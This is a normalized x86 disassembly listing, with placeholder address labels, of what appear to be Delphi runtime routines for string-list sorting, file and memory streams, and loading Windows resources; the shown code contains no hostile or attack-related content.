or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a314
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4195b0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a64
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41a37c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41992c
jmp r-xdata
sub_41a418
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a64
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a458
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b50
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a4c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41992c
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a520
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a520
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a544
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a5bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_40403c
pop edi
pop esi
pop ebx
retn
sub_41a5f8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a620
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41a654
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_419bf4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41a6a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41992c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a6f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a620
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_40403c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028f0
sub_41a76c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41992c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_40403c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a7c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41992c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a808
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a520
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a808
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41a8b8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41a914
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41a808
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a968
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41a99c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41aa00
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41aa54
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031c0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
mov esp ebp
pop ebp
retn
sub_41aaa0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031b8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41aa54
pop ecx
mov eax [ ebx ]
call sub_4031fc
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41aa54
pop ecx
sub_41ab24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41ab94
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_41abcc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_41ac04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41a988
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026f4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41ace0
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ace7
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402714
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41ab94
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41abcc
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41acf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ad48
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d400
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad4f
mov eax [ ebp - 0x8 ]
call sub_403270
retn
sub_41ad58
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41adb4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40850c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41adf4
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cad0
pop ebx
pop ebp
retn 0x8
sub_41ae1c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41ae60
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41ae60
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41af89
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4035bc
movzx edx di
mov eax esi
call sub_408430
mov ecx eax
xor edx edx
mov eax ebx
call sub_41ad58
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4084ac
mov ecx eax
xor edx edx
mov eax ebx
call sub_41ad58
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af90
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_40400c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408604
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ae54
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408604
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ae54
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
jmp r-xdata
sub_41af90
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41afb4
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
call sub_408544
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41aff0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028f0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b028
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b04c
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_41b078
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41b090
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41a988
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41ab94
sub_41b0c8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41afe8
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b0f0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b0c8
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b11c
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406bd8
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406bbc
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406bac
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
test ecx ecx
jne r-xdata
sub_41b1a8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028f0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b0c8
sub_41b1f8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4044a8
mov ecx eax
mov edx esi
mov eax edi
call sub_41b310
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41b250
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax edi
call sub_41b310
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41b2a0
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b303
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b30a
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_41b310
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b2a0
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41afe8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b2a0
pop ecx
sub_41b37c
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406ba8
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41b3cc
push ebp
mov ebp esp
push ebx
push esi
